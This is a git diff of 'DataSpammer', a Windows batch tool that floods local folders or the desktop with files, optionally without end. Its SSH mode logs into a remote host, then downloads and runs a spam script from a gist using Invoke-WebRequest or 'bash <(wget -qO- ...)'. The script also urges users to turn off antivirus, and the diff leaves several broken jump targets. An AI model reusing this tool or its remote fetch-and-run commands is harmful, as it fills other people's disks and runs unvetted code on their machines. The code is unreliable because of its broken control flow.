@@ -2,30 +2,29 @@
 :: If you want to Publish a modified Version please mention the Original Creator PIRANY and link the GitHub Repo
 :: Some Vars and Settings
 ::    Todo: 
-::    Change Signs to the Pattern git.example.copy
 ::    Fix Coulours and Dev Options
-::    Remove CD test for spaces in directory names
 ::    Try to Add a Interaktive CLI Interface, which can be dynamicly called and used by other Scripts. 
 ::    Generally Rework some Script Parts to make them more dynamic and efficient
+::    Migrate Install/DTS.bat
+::    Add BETA / STABLE Branch Switch
 
 
 
 @echo off
 chcp 65001
 powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'DataSpammer', 'Starting Dataspammer...', [System.Windows.Forms.ToolTipIcon]::None)}"
-set "current-script-version=v2.9"
+set "current-script-version=v.Beta"
 if "%1"=="h" goto help
 if "%1"=="-h" goto help
 if "%1"=="help" goto help
 if "%1"=="-help" goto help
 if "%1"=="--help" goto help
 if "%1"=="faststart" goto menu
-if "%1"=="update" goto fastgitupdate
-if "%1"=="remove" goto remove-script
-if "%1"=="start" goto quickstart
+if "%1"=="update" goto fast.git.update
+if "%1"=="remove" goto sys.delete.script
 if "%1"=="" goto normal-start
 if "%1"=="api" goto api-call
-if "%1"=="api" goto cli
+if "%1"=="api" goto sys.cli
 
 :normal-start
 @color 02
@@ -34,7 +33,7 @@ if not defined devtools (goto top-startup) else (goto dtd)
 setlocal enableextensions ENABLEDELAYEDEXPANSION 
 net session >nul 2>&1
 :: Fix Directory if started with Elevated Priviliges
-if %errorLevel% == 0 (cd %~dp0) else (goto top-startup)
+if %errorLevel% == 0 (cd /d %~dp0) else (goto top-startup)
 
 
 :top-startup
@@ -45,21 +44,10 @@ set /p firstLine=<%inputFile%
 if "%firstLine%"=="small-install" (
     set "small-install=1" && goto sys.enable.ascii.tweak
 ) else (
-    goto regular-install
+    goto check-files
 )
 
-    :regular-install
-    :: Check if Jq and Git are installed
-    for /f "delims=" %%a in ('where jq') do (
-        set "where_output=%%a"
-    )
-    if defined where_output (
-        set "jq-installed=1" && goto check-files
-    ) else (
-        set "jq-installed=0" && goto check-files
-    )
-    
-    :check-files
+:check-files
     :: Checks if all Files needed for the Script exist
     setlocal enabledelayedexpansion
     @title Starting Up...
@@ -89,21 +77,17 @@ if "%firstLine%"=="small-install" (
     @ping -n 1 localhost> nul
     set /p menu=Choose an Option from Above:
     If %menu% == 1 goto sys.open.installer
-    If %menu% == 2 goto run.no.settings
+    If %menu% == 2 goto no.settings.update
     goto sys.no.settings
 
-    :run.no.settings
-    :: Check if the Updater can run
-    if jq-installed == 1 (
-        if git-installed == 1 goto no.settings.update
-    ) else (
-        goto dts.startup.done
-    )
 
 :no.settings.update
-call :gitcall.sys
-set "small-install=1"
-goto sys.enable.ascii.tweak
+REM REDIRECT / BETA BRANCH
+goto dts.startup.done
+    call :gitcall.sys
+    set "small-install=1"
+    goto sys.enable.ascii.tweak
+
 
 :settings.extract.update
     setlocal enabledelayedexpansion
@@ -126,9 +110,11 @@ goto sys.enable.ascii.tweak
     goto dts.startup.done
 
 :gitcall.sys
-call :git.version.check
-call :git.update.check %uptodate%
+REM REDIRECT / BETA BRANCH
 exit /b
+    call :git.version.check
+    call :git.update.check %uptodate%
+    exit /b
 
 :git.version.check
     echo Checking for Updates...
@@ -143,13 +129,24 @@ exit /b
     @ping -n 1 localhost> nul
     echo Recieved API Response.
     echo Extracting Data...
-    for /f "usebackq tokens=*" %%i in (`curl -s %api_url% ^| jq -r ".tag_name"`) do (set "latest_version=%%i")
-    if "%latest_version%" equ "v2.9" (
+
+    for /f "usebackq tokens=*" %%i in (`curl -s %api_url% ^| findstr /R /C:"\"tag_name\""` ) do (
+        set "json_line=%%i"
+    )
+    
+    for /f tokens^=2^ delims^=^" %%a in ("%json_line%") do (
+        set "latest_version=%%a"
+    )
+    
+    if "%latest_version%" equ "v.Beta" (
+
         set "uptodate=up"
     ) else (
         set "uptodate="
     )
+    
     exit /b
+    
 
 :git.update.check
 if "%1"=="up" (
@@ -196,7 +193,7 @@ exit /b
 
 :git.update.version
     :: Reworked in 2.9 / should work
-    cd %~dp0
+    cd /d %~dp0
     echo @echo off > updater.bat
     echo echo Updating script... >> updater.bat
     echo curl -o dataspammer.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat >> updater.bat
@@ -235,7 +232,7 @@ exit /b
 
 :sys.open.installer
     :: Opens the Installer
-    cd %~dp0
+    cd /d %~dp0
     install.bat
     if %errorlevel% equ 0 (cls | echo Installer is running....) else (echo There was an Error. Please open the install.bat File manually.)
 
@@ -304,7 +301,7 @@ if "%lastLine%"=="dev" (
 
 
     @ping -n 1 localhost> nul
-    echo Made by PIRANY                 v2.9
+    echo Made by PIRANY                 v.Beta
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
@@ -339,7 +336,7 @@ if "%lastLine%"=="dev" (
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo [7] Check for Script and Library Updates
+    echo [7] Check for Script Updates
     echo.
     @ping -n 1 localhost> nul
     echo.
@@ -354,16 +351,12 @@ if "%lastLine%"=="dev" (
     If %menu1% == 3 goto cancel
     If %menu1% == 4 goto credits
     If %menu1% == 5 goto settings
-    If %menu1% == 6 goto autostartdeskic
+    If %menu1% == 6 goto autostart.desktop.settings
     If %menu1% == 7 goto check.lib.git.update
     If %menu1% == 8 start "" "https://github.com/PIRANY1/DataSpammer" | cls | goto menu
     goto menu
 
 :check.lib.git.update
-    :: REWORK NEEDED - Check for Lib Updates
-    echo Checking for Updates...
-    start cmd /k "scoop update && exit /b 0"
-    start cmd /k "scoop update jq && exit /b 0"
     call :gitcall.sys
     goto main
 
@@ -465,7 +458,19 @@ if %dev-mode% == 0 set "settings-dev-display=Not Activated"
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo [4] Go back
+    echo [4] Switch to Beta Branch
+    @ping -n 1 localhost> nul
+    echo. 
+    @ping -n 1 localhost> nul
+    echo.
+    @ping -n 1 localhost> nul
+    echo [5] Revert to Stable Branch
+    @ping -n 1 localhost> nul
+    echo. 
+    @ping -n 1 localhost> nul
+    echo.
+    @ping -n 1 localhost> nul
+    echo [6] Go back
     @ping -n 1 localhost> nul
     echo. 
     @ping -n 1 localhost> nul
@@ -477,8 +482,37 @@ if %dev-mode% == 0 set "settings-dev-display=Not Activated"
     If %menu4% == 1 goto settings.change.df.filename
     If %menu4% == 2 goto settings.default.directory.crash
     If %menu4% == 3 goto activate.dev.options
-    If %menu4% == 4 goto menu
+    If %menu4% == 4 goto dev.switch.branch  
+    If %menu4% == 5 goto stable.switch.branch
+    If %menu4% == 6 goto menu
     goto settings
+
+:dev.switch.branch
+    cd /d %~dp0
+    echo @echo off > updater.bat
+    echo echo Updating script... >> updater.bat
+    echo curl -o dataspammer.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/dataspammer.bat >> updater.bat
+    echo curl -o install.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/install.bat >> updater.bat
+    echo set "update-install=1" >> updater.bat
+    echo start cmd /k .\install.bat >> updater.bat
+    echo exit /b >> updater.bat
+
+    start updater.bat
+    exit /b
+
+:stable.switch.branch
+    cd /d %~dp0
+    echo @echo off > updater.bat
+    echo echo Updating script... >> updater.bat
+    echo curl -o dataspammer.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat >> updater.bat
+    echo curl -o install.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/install.bat >> updater.bat
+    echo set "update-install=1" >> updater.bat
+    echo start cmd /k .\install.bat >> updater.bat
+    echo exit /b >> updater.bat
+
+    start updater.bat
+    exit /b
+
 
 :activate.dev.options
 if %dev-mode% == 1 echo Developer Mode is already activated!
@@ -502,7 +536,7 @@ echo dev >> %tempFile%
 move /y %tempFile% %inputFile%
 echo Developer Options have been activated!
 @ping -n 1 localhost> nul
-goto restart-script
+goto restart.script
 
 :settings.change.df.filename
     :: Write Standart Filename to File
@@ -563,7 +597,7 @@ goto restart-script
     pause
     goto settings.default.directory.crash
 
-:autostartdeskic
+:autostart.desktop.settings
     :: Autostart TLI
     echo.
     cls
@@ -595,14 +629,14 @@ goto restart-script
     echo.
     set /p menu000=Choose an Option from Above:
 
-    If %menu000% == 1 goto autostartsetup
-    If %menu000% == 2 goto autostartdelete
+    If %menu000% == 1 goto autostart.setup
+    If %menu000% == 2 goto autostart.delete
     If %menu000% == 4 goto menu
     If %menu000% == 3 goto desktopicdel
-    If %menu000% == 5 goto autostartdesktsett
-    goto autostartdeskic
+    If %menu000% == 5 goto autostart.settings.page
+    goto autostart.desktop.settings
 
-:autostartsetup
+:autostart.setup
     :: Autostart Setup TLI - INOPERATIONAL - NEED TO FIX ASAP
     echo This Setup will lead you trough the Autostart/Desktopicon Setup.
     @ping -n 1 localhost> nul
@@ -628,10 +662,10 @@ goto restart-script
     set /p menu123134=Choose an Option from Above:
 
     If %menu123134% == 3 goto viewdocs 
-    If %menu123134% == 1 goto autostartsetupconfyy
+    If %menu123134% == 1 goto autostart.setup.confirmed
     If %menu123134% == 4 goto autostart
-    If %menu123134% == 2 goto desktopiconsetup
-    goto autostartsetup
+    If %menu123134% == 2 goto desktop.icon.setup
+    goto autostart.setup
 
 :viewdocs 
     @ping -n 1 localhost> nul
@@ -660,16 +694,16 @@ goto restart-script
     @ping -n 1 localhost> nul
     set /p viewdocsmenu=Choose an Option from above:
 
-    If %viewdocsmenu% == 1 goto autostartsetup
-    If %viewdocsmenu% == 2 goto desktopiconsetup
-    If %viewdocsmenu% == 3 goto autostartsetupconfyy
+    If %viewdocsmenu% == 1 goto autostart.setup
+    If %viewdocsmenu% == 2 goto desktop.icon.setup
+    If %viewdocsmenu% == 3 goto autostart.setup.confirmed
     goto viewdocs
 
-:autostartdelete
+:autostart.delete
     setlocal enableextensions ENABLEDELAYEDEXPANSION 
     net session >nul 2>&1
-    if %errorLevel% == 0 (goto autostartdelete2) else (goto noelev)
-:autostartdelete2
+    if %errorLevel% == 0 (goto autostart.delete.2) else (goto sys.script.administrator)
+:autostart.delete.2
     echo Autostart is getting detected as a Virus from some antivirus Programs. 
     echo A Tutorial on how to temporarily turn off your AV is down below
     echo.
@@ -688,23 +722,23 @@ goto restart-script
     @ping -n 1 localhost> nul
     echo [4] Close the Script
     set /P avturnoff=Choose an Option from above
-    if %avturnoff% == 1 start "" "https://www.security.org/antivirus/turn-off/" | cls | goto autostartdelete2
+    if %avturnoff% == 1 start "" "https://www.security.org/antivirus/turn-off/" | cls | goto autostart.delete.2
     if %avturnoff% == 2 cls | goto viewdocs 
-    if %avturnoff% == 3 cls | goto autostartdelete3
+    if %avturnoff% == 3 cls | goto autostart.delete.3
     if %avturnoff% == 4 cls | goto cancel
-    goto autostartdelete2
+    goto autostart.delete.2
 
-:autostartdelete3
+:autostart.delete.3
     @ping -n 1 localhost> nul
     cd /d C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
     del autostart.bat
     cd /d %~dp0
 
-:autostartsetupconfyy
+:autostart.setup.confirmed
     setlocal enableextensions ENABLEDELAYEDEXPANSION 
     net session >nul 2>&1
-    if %errorLevel% == 0 (goto autostartsetupconfyy2) else (goto noelev)
-:autostartsetupconfyy2
+    if %errorLevel% == 0 (goto autostart.setup.confirmed.2) else (goto sys.script.administrator)
+:autostart.setup.confirmed.2
     @ping -n 1 localhost> nul
     echo The Setup for Autostart is now starting...
     cd /d C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
@@ -719,12 +753,12 @@ goto restart-script
     cd /d %~dp0
 
 
-:desktopiconsetup
+:desktop.icon.setup
     setlocal enableextensions ENABLEDELAYEDEXPANSION 
     net session >nul 2>&1
-    if %errorLevel% == 0 (goto desktopiconsetup2) else (goto noelev)
-:desktopiconsetup2
-    cd %userprofile%\Desktop
+    if %errorLevel% == 0 (goto desktop.icon.setup.2) else (goto sys.script.administrator)
+:desktop.icon.setup.2
+    cd /d %userprofile%\Desktop
     echo. > DataSpammer.bat
     set "varlinkauto=%~dp0"
     (
@@ -734,24 +768,21 @@ goto restart-script
     ) > DataSpammer.bat
     echo Done!
     pause
-    goto autostartdeskic
+    goto autostart.desktop.settings
                                                                                                     
 
-:autostartdesktsett
+:autostart.settings.page
     echo.
     @ping -n 1 localhost> nul
     echo If you have moved the Directory please Delete the Autostart and Then Set it up new
     @ping -n 1 localhost> nul
     pause
-    goto autostartdeskic
-
-:quickstart
-
+    goto autostart.desktop.settings
 
 
 
 :start
-    call :verify
+    call :sys.verify.execution
     cls
     echo Choose the Method you want to use:
     @ping -n 1 localhost> nul
@@ -776,14 +807,14 @@ goto restart-script
     echo.
     set /p spammethod=Choose an Option from Above:
 
-    If %spammethod% == 1 goto txtspamchose
-    If %spammethod% == 2 goto deskiconspam
-    If %spammethod% == 3 goto remotespam
+    If %spammethod% == 1 goto normal.text.spam
+    If %spammethod% == 2 goto desktop.icon.spam
+    If %spammethod% == 3 goto ssh.spam
     If %spammethod% == 4 goto menu
     goto start187
 
-:remotespam
-    :: Not working - TLI For remotespam
+:ssh.spam
+    :: Not working - TLI For ssh.spam
     echo In Order to work the Remote Spam Method needs 4 Things.
     @ping -n 1 localhost> nul
     echo 1: The IP of the Device you want to spam
@@ -801,10 +832,10 @@ goto restart-script
     echo [2] Back
     echo.
     set /P remotespamchoose=Choose an Option from above:
-    if %remotespamchoose% == 1 goto ssh-spam-info
+    if %remotespamchoose% == 1 goto ssh.spam.info
     if %remotespamchoose% == 2 goto start187
 
-:ssh-spam-info
+:ssh.spam.info
     :: Ask the User to enter the IP - supported with arp
     echo Please specify the IP of the Device
     @ping -n 1 localhost> nul
@@ -820,29 +851,29 @@ goto restart-script
     if %ssh-ip% == help (
         start "" "https://support.ucsd.edu/services?id=kb_article_view&sysparm_article=KB0032480"
     ) else (
-        goto ssh-spam-setup
+        goto ssh.spam.setup
     )
-:ssh-spam-setup
+:ssh.spam.setup
     :: Check if IP is valid
     setlocal enabledelayedexpansion
     echo !ssh-ip! | findstr /R "^([0-9]{1,3}\.){3}[0-9]{1,3}$"
     if %errorlevel% equ 0 (
-        goto ssh-spam-setup-2
+        goto ssh.spam.setup.2
     ) else (
         echo The IP you entered doesnt seem Valid. Please try again.
         pause
-        gotossh-spam-info
+        goto ssh.spam.info
     )
 
-:ssh-spam-setup-2
+:ssh.spam.setup.2
     :: Enter other things needed for Remotespam
     set /P ssh-name=Enter an Account Name:
     rem set /P ssh-pswd=Enter the Password of the Account:
     set /P ssh-filecount=How many files do you want to create:
-    call :verify
+    call :sys.verify.execution
     cls
 
-:start-ssh
+:start.ssh
     :: 100% UD ASSET COUNTER (Does nothing)
     set "assetcount=1"
     :assetcounttop
@@ -851,9 +882,9 @@ goto restart-script
     echo Loading Assets [%assetcount%/32]
     set /a "assetcount+=1"
     cls
-    If %assetcount% == 33 (goto ssh-start-spam) else (goto assetcounttop)
+    If %assetcount% == 33 (goto ssh.start.spam) else (goto assetcounttop)
 
-:ssh-start-spam
+:ssh.start.spam
     echo Is the SSH Target based on Linux or Windows?
     echo.
     echo [1] Windows
@@ -862,22 +893,22 @@ goto restart-script
     echo.
     echo.
     set /P linux-win-ssh=Choose an Option from Above:
-    if %linux-win-ssh% == 1 goto spam-ssh-target-win
-    if %linux-win-ssh% == 2 goto spam-ssh-target-lx
+    if %linux-win-ssh% == 1 goto ssh.start.spam
+    if %linux-win-ssh% == 2 goto spam.ssh.target.lx
 
-:spam-ssh-target-win
+:spam.ssh.target.win
 set ssh_command="Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%"
 ssh %ssh-name%@%ssh-ip% "powershell -Command %ssh_command%"
 echo Successfully executed SSH Connection.
-goto ssh-done
+goto ssh.done
 
-:spam-ssh-target-lx
+:spam.ssh.target.lx
 set ssh_command="bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%"
 ssh %ssh-name%@%ssh-ip% "%ssh_command%"
 echo Successfully executed SSH Connection.
-goto ssh-done
+goto ssh.done
 
-:ssh-done
+:ssh.done
     :: Remote Spam Done TLI
     echo.
     %$Echo% "   ____        _        ____                                            _           ____ ___ ____      _    _   ___   __
@@ -911,9 +942,9 @@ goto ssh-done
     set /p menu9=Choose an Option from Above:
     If %menu9% == 1 goto cancel
     If %menu9% == 2 goto menu
-    goto ssh-done
+    goto ssh.done
 
-:deskiconspam
+:desktop.icon.spam
     :: Desktop Spam Start TLI
     @ping -n 1 localhost> nul
     echo This Method will Spam your Desktop with Files
@@ -939,19 +970,19 @@ goto ssh-done
     echo.
     set /p menu1877=Choose an Option from Above:
     If %menu1877% == 2 goto start
-    If %menu1877% == 1 goto deskiconspam1
-    goto deskiconspam
+    If %menu1877% == 1 goto desktop.icon.spam.1
+    goto desktop.icon.spam
 
-:deskiconspam1
+:desktop.icon.spam.1
     :: Name TLI
     echo How Should the Files be named?
     @ping -n 1 localhost> nul
     echo The Filename cant include one of the following Character(s):\ / : * ? " < > |"
     @ping -n 1 localhost> nul
     set /p "deskiconspamname=Choose a Filename:"
-    goto deskiconspam2
+    goto desktop.icon.spam.2
 
-:deskiconspam2  
+:desktop.icon.spam.2 
     :: Format TLI
     echo Now Choose the Format of the File
     @ping -n 1 localhost> nul
@@ -960,26 +991,26 @@ goto ssh-done
     echo Please not include the dot
     @ping -n 1 localhost> nul
     set /p "deskiconspamformat=Choose the Format:"
-    goto deskiconspam3
+    goto desktop.icon.spam.3
 
-:deskiconspam3
+:desktop.icon.spam.3
     :: Content TLI
     echo Now Choose the Content the File should include
     @ping -n 1 localhost> nul
     set /p "deskiconspamcontent=Type something in:"
-    goto deskiconspam4
+    goto desktop.icon.spam.4
 
-:deskiconspam4
+:desktop.icon.spam.4
     :: Filecount TLI
     echo Now Choose how many files should be created 
     @ping -n 1 localhost> nul
     echo Leave empty if you want infinite.
     @ping -n 1 localhost> nul
     set /p "deskiconspamamount=Type a Number:"
-    call :verify
+    call :sys.verify.execution
     cls
 
-:deskiconspamconfdata
+:desktop.icon.spam.confirm.data
     :: 100% UD ASSET COUNTER (does nothing but look cool)
     set "assetcount=1"
     :assetcounttop
@@ -987,9 +1018,9 @@ goto ssh-done
     @ping -n 1 localhost> nul
     echo Loading Assets(%assetcount%/32)
     set /a "assetcount+=1"
-    If %assetcount% == 33 (goto deskiconspamsetdonestart) else (goto assetcounttop)
+    If %assetcount% == 33 (goto desktop.icon.spam.confirmed.start) else (goto assetcounttop)
 
-:deskiconspamsetdonestart
+:desktop.icon.spam.confirmed.start
     :: Desktop Spam Countdown
     cls
     color 02
@@ -1005,37 +1036,37 @@ goto ssh-done
     echo Starting.....
     cd /d %userprofile%\Desktop
     if not defined deskiconspamamount (
-        goto infinitespam
+        goto infinite.desktop.spam
     ) else (
-        goto limitedspam
+        goto limitedspam.desktop.spam
     )
     exit
 
 
-:infinitespam
+:infinite.desktop.spam
     :: Infinite Spam Function
-    :deskspamtop
+    :infinite.desktop.spam.1
     echo %deskiconspamcontent% > %deskiconspamname%.%deskiconspamformat%
-    goto deskspamtop
+    goto infinite.desktop.spam.1
     exit
 
-:limitedspam
+:limited.desktop.spam
     :: Limited Spam Function
     color 02
     set "deskspamlimitedvar=1"
-    :limitedspam1
-    If %deskspamlimitedvar% == %deskiconspamamount% (goto done2) else (goto limitedspam2)
-    :limitedspam2
+    :limited.desktop.spam.1
+    If %deskspamlimitedvar% == %deskiconspamamount% (goto done2) else (goto limited.desktop.spam.2)
+    :limited.desktop.spam.2
     echo Created %deskspamlimitedvar% File(s)
     echo %deskiconspamcontent% > %deskiconspamname%%deskspamlimitedvar%.%deskiconspamformat%
     set /a "deskspamlimitedvar+=1"
-    goto limitedspam1
+    goto limited.desktop.spam.1
 
-:txtspamchose
+:normal.text.spam
     :: dont know if that function is even used but it works
-    if stdrc1 equ notused (goto novarset) else (cd /d %stdrc1% && goto nameset)
+    if stdrc1 equ notused (goto sys.no.var.set) else (cd /d %stdrc1% && goto sys.check.custom.name)
 
-:novarset
+:sys.no.var.set
     :: normal spam tli
     cls
     echo Please enter the Directory of the Folder/Server you want to Spam.
@@ -1061,14 +1092,14 @@ goto ssh-done
     echo [2] Enter a Directory
     @ping -n 1 localhost> nul
     set /p menu5=Choose an Option from Above:
-    If %menu5% == 1 goto userdrc
-    If %menu5% == 2 goto manualcd
+    If %menu5% == 1 goto spam.use.user
+    If %menu5% == 2 goto spam.custom.directory
 
-:userdrc 
+:spam.use.user
     :: what is this doin here?
     cd /d %userprofile%
 
-:manualcd
+:spam.custom.directory
     :: enter directory tli
     echo.
     echo.
@@ -1080,23 +1111,23 @@ goto ssh-done
         echo There was an Error. Please check if the Directory is correct or retry later. 
     ) else (
         echo The Directory was Correct!
-        goto nameset
+        goto sys.check.custom.name
     )
 
-:nameset
+:sys.check.custom.name
     :: check if filename setting is used
-    if %stdfile% equ notused (goto nameset2) else (goto timerask)
+    if %stdfile% equ notused (goto sys.check.custom.name.2) else (goto spam.time.window.ask)
 
-:nameset2
+:sys.check.custom.name.2
     :: filename tli
     cls
     echo Now You have to choose a filename. It can be anything as long as the 
     echo Filename doesnt have the following Character(s):\ / : * ? " < > |"
     set /p stdfile=Type in the Filename you want to use.
     setlocal enabledelayedexpansion
-    goto timerask
+    goto spam.time.window.ask
 
-:timerask
+:spam.time.window.ask
     :: check if the script should run for eternity
     cls
     echo.
@@ -1108,11 +1139,11 @@ goto ssh-done
     echo If you choose No the script will run for eternity.
     @ping -n 1 localhost> nul
     set /p menu6=Yes[y]  No [n]:
-    If %menu6% == y goto timerset
-    If %menu6% == n set "filecount=1%large%%large%%large%%large%%large%%large%%large%%large%%large%%large%%large%" && goto cddone
-    goto timerask
+    If %menu6% == y goto spam.time.window.set 
+    If %menu6% == n set "filecount=1%large%%large%%large%%large%%large%%large%%large%%large%%large%%large%%large%" && goto spam.ready.to.start
+    goto spam.time.window.ask
 
-:timerset 
+:spam.time.window.set 
     :: filecount tli
     cls
     @ping -n 1 localhost> nul
@@ -1122,9 +1153,9 @@ goto ssh-done
     @ping -n 1 localhost> nul
     echo How many Files should be created?
     set /p filecount=Type a Number:
-    goto cddone
+    goto spam.ready.to.start
 
-:cddone
+:spam.ready.to.start
     :: confirmation dialoge
     cls
     echo. 
@@ -1145,12 +1176,12 @@ goto ssh-done
     @ping -n 2 localhost> nul
     echo Starting......
     echo If you want to stop this script simply close the Command Windows or press ALT+F4 / CTRL+C
-:top
+:spam.normal.top
     :: create files
     set /a x+=1
     echo. > %stdfile%%x%.txt
     echo Created %x% File(s).
-    if %x% equ %filecount% (goto done) else (goto top)
+    if %x% equ %filecount% (goto done) else (goto spam.normal.top)
 
 
 :done
@@ -1259,21 +1290,31 @@ goto ssh-done
     exit /b 1464
 
 :: Whitout the UD stuff
-:fastgitupdate
-    :: Check for Update (Why not restart the Script at all and then check for updates)
+:fast.git.update
+
     set "owner=PIRANY1"
     set "repo=DataSpammer"
     set "api_url=https://api.github.com/repos/%owner%/%repo%/releases/latest"
     echo Fetching Data...
-    for /f "usebackq tokens=*" %%i in (`curl -s %api_url% ^| jq -r ".tag_name"`) do (set "latest_version=%%i")
-    if %latest_version% equ %current-script-version% (
+
+    for /f "usebackq tokens=*" %%i in (`curl -s %api_url% ^| findstr /R /C:"\"tag_name\""` ) do (
+        set "json_line=%%i"
+    )
+
+    for /f tokens^=2^ delims^=^" %%a in ("%json_line%") do (
+        set "latest_version=%%a"
+    )
+
+    if "%latest_version%" equ "%current-script-version%" (
         echo The Script is up-to-date [Version:%latest_version%]
     ) else (
         echo Your Script is outdated [Newest Version: %latest_version% Script Version:%current-script-version%]
     )
+    
     exit /b 0
 
-:remove-script
+
+:sys.delete.script
     :: Delete Script TLI
     echo. 
     @ping -n 1 localhost> nul
@@ -1299,18 +1340,18 @@ goto ssh-done
     echo.
     set /p delscrconf=Choose an Option from Above
 
-    If %delscrconf% == 1 goto remove-script-confirmed
-    If %delscrconf% == 2 explorer "https://github.com/PIRANY1/DataSpammer" && goto remove-script
+    If %delscrconf% == 1 goto sys.delete.script.check.elevation
+    If %delscrconf% == 2 explorer "https://github.com/PIRANY1/DataSpammer" && goto sys.delete.script
     If %delscrconf% == 3 exit /b 100
-    goto remove-script
+    goto sys.delete.script
 
-:remove-script-check-elev
+:sys.delete.script.check.elevation
     :: Check if Script is elevated
     setlocal enableextensions ENABLEDELAYEDEXPANSION 
     net session >nul 2>&1
-    if %errorLevel% == 0 (goto remove-script-confirmed) else (goto noelev)
+    if %errorLevel% == 0 (goto sys.delete.script.confirmed) else (goto sys.script.administrator)
    
-:remove-script-confirmed
+:sys.delete.script.confirmed
     :: Delete Script 
     if exist "%~dp0\LICENSE" del "%~dp0\LICENSE"
     echo 1/7 Files Deleted
@@ -1332,11 +1373,12 @@ goto ssh-done
     echo 6/7 Files Deleted
     @ping -n 1 localhost> nul
     set "startMenuPrograms=%ProgramData%\Microsoft\Windows\Start Menu\Programs"
-    cd %startMenuPrograms%
+    cd /d %startMenuPrograms%
     if exist "Dataspammer.bat" del "Dataspammer.bat"
     echo 7/7 Files Deleted
     echo Uninstall Successfull
-:noelev
+    
+:sys.script.administrator
     :: Script isnt elevated TLI
     echo Please start the Script as Administrator in order to install.
     echo To do this right click the Dataspammer File and click "Run As Administrator"
@@ -1345,24 +1387,24 @@ goto ssh-done
     explorer %~dp0
     exit 0
 
-:restart-script
+:restart.script
 set "restart-main=1"
 install.bat
 
-:cli
+:sys.cli
 @echo off
 chcp 65001 >nul
 for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
 echo Type 'help' to get an overview of commands
-:input
+:sys.cli.input
 echo.
 echo  [97m???[0m([92m%username%[0m@[95m%computername%[0m)-[[91m%cd%[0m] - [[94m%time% %date%[0m]
 set /p cmd=".%BS% [97m???>[0m "
 echo.
 %cmd%
-goto input
+goto sys.cli.input
 
-:verify
+:sys.verify.execution
 set "verify=%random%"
 powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Please enter Code %verify% to confirm that you want to execute this Option', 'DataSpammer Verify')}" > %TEMP%\out.tmp
 set /p OUT=<%TEMP%\out.tmp
@@ -1376,7 +1418,7 @@ exit /b
 :failed
 set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('You have entered the wrong Code. Please try again', 'DataSpammer Verify');}"
 powershell -Command %msgBoxArgs%
-goto verify
+goto sys.verify.execution
 
 :cancel 
     :: yes
